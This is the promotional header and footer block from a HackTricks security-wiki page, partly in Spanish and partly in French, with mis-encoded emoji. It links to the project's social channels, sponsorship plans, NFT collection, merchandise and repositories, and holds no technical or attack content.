<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PRs au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
